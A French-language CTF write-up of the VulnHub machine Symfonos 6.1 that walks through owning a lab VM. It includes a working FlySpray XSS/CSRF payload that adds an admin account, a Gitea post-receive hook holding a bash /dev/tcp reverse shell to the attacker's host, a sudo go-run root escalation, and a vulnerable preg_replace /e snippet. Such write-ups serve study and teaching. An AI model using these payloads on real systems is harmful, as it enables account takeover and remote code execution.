# Solution du CTF Symfonos #6 de VulnHub

[symfonos: 6.1](https://vulnhub.com/entry/symfonos-61,458/), le dernier CTF de cette série, ne m'a pas déçu. Il était original tout en laissant peu de doute sur les actions à réaliser.

```
Nmap scan report for 192.168.56.117
Host is up (0.00015s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 0ead33fc1a1e8554641339146809c170 (RSA)
|   256 54039b4855deb32b0a78904ab31ffacd (ECDSA)
|_  256 4e0ce63d5c0809f4114885a2e7fb8fb7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=e81eb32aa0c28c8a; Path=/; HttpOnly
|     Set-Cookie: _csrf=bu3j7x7HDezW7m-0kNfMOsH93oM6MTY3NzA2NzAxNTUyMDEwNDU3Mw; Path=/; Expires=Thu, 23 Feb 2023 11:56:55 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 22 Feb 2023 11:56:55 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|     console.info('ServiceWorker registration successful with scope: ', registrat
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=9f8101b1a37d9282; Path=/; HttpOnly
|     Set-Cookie: _csrf=1JAbwquMps8JP6GI39q7b40lvlc6MTY3NzA2NzAyMDU0NDg0NTcyMg; Path=/; Expires=Thu, 23 Feb 2023 11:57:00 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 22 Feb 2023 11:57:00 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|_    console.info('ServiceWorker registration successful
3306/tcp open  mysql   MariaDB (unauthorized)
5000/tcp open  upnp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Wed, 22 Feb 2023 14:47:19 GMT
|     Content-Length: 18
|     page not found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Wed, 22 Feb 2023 14:46:48 GMT
|     Content-Length: 18
|     page not found
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Wed, 22 Feb 2023 14:47:03 GMT
|     Content-Length: 18
|_    page not found
```

J'ai choisi d'attaquer directement le port 80 et de laisser le port 3000 pour plus tard, ce qui s'est avéré être une bonne idée.

## Amanite tue-mouches

Je trouve via énumération un dossier `/posts` qui retourne une erreur 500 ainsi qu'un dossier nommé `FlySpray` :

```shellsession
$ feroxbuster -u http://192.168.56.117/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -f -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.117/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403        8l       22w      210c http://192.168.56.117/cgi-bin/
200     1006l     4983w        0c http://192.168.56.117/icons/
500       23l       93w      943c http://192.168.56.117/posts/
200       21l       30w      251c http://192.168.56.117/
200      474l     1627w        0c http://192.168.56.117/flyspray/
[####################] - 16s    62260/62260   0s      found:5       errors:0      
[####################] - 16s    62260/62260   3854/s  http://192.168.56.117/
```

Le `FlySpray` en question est une appli de gestion de tickets (bugtracker): [GitHub - flyspray/flyspray: Flyspray Bug Tracking System](https://github.com/Flyspray/flyspray/)

Sur le ticket déjà présent on peut voir un certain `Mr Super User` indiquer qu'il surveille de près l'issue.

![Mr Super User is watching](https://raw.githubusercontent.com/devl00p/blog/main/images/vulnhub/symfonos6/mr_super_user_watching.jpg)

Ca tombe bien car il existe une faille XSS dans `Flyspray` : [FlySpray 1.0-rc4 - Cross-Site Scripting / Cross-Site Request Forgery - PHP webapps Exploit](https://www.exploit-db.com/exploits/41918)

Le champ vulnérable est celui du `real_name` quand on édite le profil d'un utilisateur. Si on y injecte du javascript il sera exécuté quand un utilisateur tombera sur un de nos messages.

Par conséquent j'ai créé un compte sur l'appli puis j'ai repris le code d'exploitation et l'ait placé dans un fichier `adduser.js` :

```js
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form" action="http://192.168.56.117/flyspray/index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
```

Ensuite j'ai édité le profil de mon utilisateur pour qu'il appelle mon code javascript :

![Injection JS code](https://raw.githubusercontent.com/devl00p/blog/main/images/vulnhub/symfonos6/xss_payload_injection.jpg)

Et finalement j'ai posté un commentaire sur l'issue. Cependant j'ai remarqué que le javasript nécessitait d'échapper un attribut HTML :

```html
<div class="comment_avatar"><a class="av_comment" href="http://192.168.56.117/flyspray/index.php?do=user&area=users&id=2" title="<script src="http://192.168.56.1:9999/adduser.js"></script>">
```

J'ai changé ça et aussi choisi de fermer le tag en cours :

```html
"></a><script src="http://192.168.56.1:9999/adduser.js"></script>
```

Cette fois ça n'a pas été long à tomber dans le piège :

```shellsession
$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
192.168.56.117 - - [22/Feb/2023 13:32:18] "GET /adduser.js HTTP/1.1" 200 -
```

Grace au code javascript je peux alors me connecter avec les identifiants `hacker` / `12345678` et profiter des privilèges admin, à savoir voir l'ensemble des tickets.

## Capitaine Hook

Il y a en effet un autre ticket avec des identifiants :

> ## FS#2 - self hosted git service
> 
> I have configured gitea for our git needs internally!
> 
> Here are my creds in case anyone wants to check out our project!
> 
> achilles:h2sBr9gryBunKdF9

Ces identifiants ne permettant pas d'accéder au compte via SSH car seule une authentification par clé est permise mais on peut les utiliser pour nous connecter au `Gitea` sur le port 3000.

Il existe un exploit pour `Gitea` mais il semble avoir été publié après que le CTF soit disponible, ce n'est donc probablement pas la solution officielle : [Gitea 1.12.5 - Remote Code Execution (Authenticated) - Multiple webapps Exploit](https://www.exploit-db.com/exploits/49571)

Un peu comme sur les CTF comportant du Jenkins (voir [Solution du CTF Jeeves de HackTheBox](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Jeeves%20de%20HackTheBox.md)) où il fallait créer une étape de build sur un projet, ici nous allons créer un hook qui exécutera des commandes lorsque du code est poussé sur un projet Git.

Au lieu d'utiliser l'exploit j'ai effectué les commandes moi même. D'abord il faut créer le répo via l'interface web de `Gitea` puis créer le répo local, définir le répo distant puis pousser :

```shellsession
$ mkdir yolo
$ cd yolo
$ touch README.md
$ git init
astuce: Utilisation de 'master' comme nom de la branche initiale. Le nom de la branche
astuce: par défaut peut changer. Pour configurer le nom de la branche initiale
astuce: pour tous les nouveaux dépôts, et supprimer cet avertissement, lancez :
astuce: 
astuce:         git config --global init.defaultBranch <nom>
astuce: 
astuce: Les noms les plus utilisés à la place de 'master' sont 'main', 'trunk' et
astuce: 'development'. La branche nouvellement créée peut être rénommée avec :
astuce: 
astuce:         git branch -m <nom>
Dépôt Git vide initialisé dans /tmp/192.168.56.116/yolo/.git/
$ git add README.md
$ git commit -m "first commit"
[master (commit racine) 6576b2c] first commit
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 README.md
$ git remote add origin http://192.168.56.117:3000/achilles/yolo.git
$ git push -u origin master
Énumération des objets: 3, fait.
Décompte des objets: 100% (3/3), fait.
Écriture des objets: 100% (3/3), 214 octets | 214.00 Kio/s, fait.
Total 3 (delta 0), réutilisés 0 (delta 0), réutilisés du pack 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://192.168.56.117:3000/achilles/yolo.git
 * [new branch]      master -> master
la branche 'master' est paramétrée pour suivre 'origin/master'.
```

Ensuite depuis `Gitea` il faut aller dans les `Settings` du projet, onglet `Git Hooks` et définir un `post-receive` avec ce code :

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.1/7777 0>&1 &
```

Retour en ligne de commande où je fais une modification et pousse le code :

```shellsession
$ echo "this is dope" > README.md 
$ git add .
$ git commit -m "trigger that"
[master f20c3b3] trigger that
 1 file changed, 1 insertion(+)
$ git push
Énumération des objets: 5, fait.
Décompte des objets: 100% (5/5), fait.
Écriture des objets: 100% (3/3), 255 octets | 255.00 Kio/s, fait.
Total 3 (delta 0), réutilisés 0 (delta 0), réutilisés du pack 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://192.168.56.117:3000/achilles/yolo.git
   6576b2c..f20c3b3  master -> master
```

J'obtiens alors mon reverse-shell sur le port 7777 :

```shellsession
$ ncat -l -p 7777 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 192.168.56.117.
Ncat: Connection from 192.168.56.117:53184.
bash: no job control in this shell
[git@symfonos6 yolo.git]$ id
uid=997(git) gid=995(git) groups=995(git)
[git@symfonos6 yolo.git]$ cd /home/git
[git@symfonos6 ~]$ cd .ssh
[git@symfonos6 .ssh]$ echo ssh-rsa AAAAB--- snip ---cT7Q== >> authorized_keys
```

## Go go gadgeto shell

Cette fois le mot de passe `h2sBr9gryBunKdF9` permet de se connecter en tant que `achilles` via `su`.

Cette utilisateur peut utiliser l'outil du langage `Golang` en tant que root :

```shellsession
[achilles@symfonos6 git]$ sudo -l
Entrées par défaut pour achilles sur symfonos6 :
    !visiblepw, always_set_home, match_group_by_gid, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

L'utilisateur achilles peut utiliser les commandes suivantes sur symfonos6 :
    (ALL) NOPASSWD: /usr/local/go/bin/go
```

C'est certainement une vieille version car `go mod init` n'est pas supporté ici.

J'ai écrit ce code `Go` qui appelle bash en redirigeant les entrées / sorties :

```go
package main

import (
    "fmt"
    "os"
    "os/exec"
)

func main() {
    cmd := exec.Command("bash")
    cmd.Stdin = os.Stdin
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    if err := cmd.Run(); err != nil {
        fmt.Println("Failed to start bash:", err)
    }
}
```

Et ça fonctionne :

```shellsession
[achilles@symfonos6 ~]$ sudo /usr/local/go/bin/go run gotroot.go 
[root@symfonos6 achilles]# id
uid=0(root) gid=0(root) groupes=0(root)
[root@symfonos6 achilles]# cd /root
[root@symfonos6 ~]# ls
proof.txt  scripts
[root@symfonos6 ~]# cat proof.txt

           Congrats on rooting symfonos:6!
                  ,_---~~~~~----._         
           _,,_,*^____      _____``*g*\"*, 
          / __/ /'     ^.  /      \ ^@q   f 
         [  @f | @))    |  | @))   l  0 _/  
          \`/   \~____ / __ \_____/    \   
           |           _l__l_           I   
           }          [______]           I  
           ]            | | |            |  
           ]             ~ ~             |  
           |                            |   
            |                           |   
     Contact me via Twitter @zayotic to give feedback!
```

Comme dit plus tôt, cette solution n'est sans doute pas la solution officielle.

## @lasolutionofficielle

Quand on a accès au `Gitea` on voit deux répos, l'un pour une API en Go et un blog en PHP. Les deux semblent communiquer mais surtout on remarque le flag `/e` sur un appel à `preg_replace` :

```php
while ($row = mysqli_fetch_assoc($result)) {
		$content = htmlspecialchars($row['text']);
		
		echo $content;
	
		preg_replace('/.*/e',$content, "Win");
}
```

Pour un exemple d'exploitation voir le [CTF Nebula level 9](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Nebula%20(levels%200%20%C3%A0%2011).md#level-9)

La solution décrite sur l'article http://ratmirkarabut.com/articles/vulnhub-writeup-symfonos-6-1/ consiste à utiliser l'API écrite en Go (qui écoute sur le port 5000) pour injecter du code PHP dans un post puis appeller le blog pour que `preg_replace` exécute le code.

On obtient alors un RCE avec l'utilisateur `apache` et on peut `su` pour `achilles` comme on l'a fait.

## Sous le capot

Un petit coup d'oeil au code qui simulait l'utilisateur de `FlySpray` :

```python
#!/usr/bin/python3.6

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from time import sleep
import os
import re

chrome_options = Options()  
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(executable_path='/usr/local/bin/chromedriver', chrome_options=chrome_options)

interfaces = os.listdir('/sys/class/net/')
for i in interfaces:                                                                                                                                                                      
    if i != "lo":                                                                                                                                                                         
        interface = i                                                                                                                                                                     
        break
          
ipv4 = re.search(re.compile(r'(?<=inet )(.*)(?=\/)', re.M), os.popen('/usr/sbin/ip addr show ' + interface).read()).groups()[0]

while True:
        url = "http://{}/flyspray/".format(ipv4)
        print("URL: " + url)
        sleep(3)
        driver.get(url)
        driver.find_element_by_id("show_loginbox").click()
        driver.find_element_by_id("lbl_user_name").send_keys("achilles")
        driver.find_element_by_id("lbl_password").send_keys("aqMeqTqVzYFjD2ak")
        driver.find_element_by_id("login_button").click()
        print("Logged in: " + driver.title)
        sleep(3)
        driver.get(url + "index.php?do=details&task_id=1")
        print("Get hacked: " + driver.title)
        sleep(3)
        driver.get(url + "index.php?do=authenticate&logout=1")
        print("Logged out: " + driver.title)
        print("\nSleeping for 60 seconds...")
        sleep(60)
```

Ca fait plaisir de voir quelqu'un savoir ce qu'il fait :)

*Publié le 22 février 2023*
